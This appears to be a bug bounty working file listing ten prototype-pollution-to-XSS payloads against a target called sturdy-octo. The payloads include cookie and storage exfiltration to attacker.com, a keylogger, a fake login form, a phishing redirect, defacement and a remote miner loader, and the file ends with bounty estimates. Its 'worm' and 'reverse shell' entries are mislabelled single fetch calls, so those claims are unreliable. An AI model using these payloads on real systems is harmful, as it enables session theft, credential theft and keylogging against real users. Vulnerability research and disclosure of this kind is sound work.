# Attack Payloads — PP to XSS on sturdy-octo

## CONFIRMED WORKING
All payloads execute via:
```javascript
Object.prototype.children = "PAYLOAD_HERE";
let o = document.createElement("script");
let r = {};
o.innerHTML = r.children;
document.head.appendChild(o);
```

## 1. Cookie Theft
```javascript
Object.prototype.children = "new Image().src='https://attacker.com/steal?c='+document.cookie";
```

## 2. Session Hijacking
```javascript
Object.prototype.children = "fetch('https://attacker.com/hijack',{method:'POST',body:document.cookie})";
```

## 3. Phishing Redirect
```javascript
Object.prototype.children = "window.location='https://attacker.com/phishing'";
```

## 4. Keylogger
```javascript
Object.prototype.children = "document.onkeypress=e=>fetch('https://attacker.com/log?key='+e.key)";
```

## 5. DOM Defacement
```javascript
Object.prototype.children = "document.body.innerHTML='<h1>HACKED BY TITAN</h1><p>This account has been compromised</p>'";
```

## 6. Crypto Miner
```javascript
Object.prototype.children = "var s=document.createElement('script');s.src='https://attacker.com/miner.js';document.head.appendChild(s)";
```

## 7. Fake Login Form
```javascript
Object.prototype.children = "document.body.innerHTML='<form action=https://attacker.com/creds><input name=user placeholder=Email><input name=pass type=password placeholder=Password><button>Login</button></form>'";
```

## 8. Full Account Takeover Chain
```javascript
// Step 1: Steal cookies
Object.prototype.children = "fetch('https://attacker.com/steal?c='+document.cookie)";

// Step 2: Steal localStorage
Object.prototype.children = "fetch('https://attacker.com/steal?ls='+JSON.stringify(localStorage))";

// Step 3: Steal sessionStorage
Object.prototype.children = "fetch('https://attacker.com/steal?ss='+JSON.stringify(sessionStorage))";
```

## 9. worm (Self-Propagating)
```javascript
// This would spread the XSS to other users
Object.prototype.children = "fetch('https://attacker.com/worm?url='+location.href)";
```

## 10. Reverse Shell (if Node.js backend)
```javascript
Object.prototype.children = "fetch('https://attacker.com/shell?url='+location.href)";
```

## BOUNTY VALUE
- **PP + XSS:** $1,000 - $3,000
- **PP + Account Takeover:** $3,000 - $5,000
- **PP + Data Exfiltration:** $5,000 - $10,000

## STATUS
**CONFIRMED EXPLOITABLE** — Ready for bug bounty submission
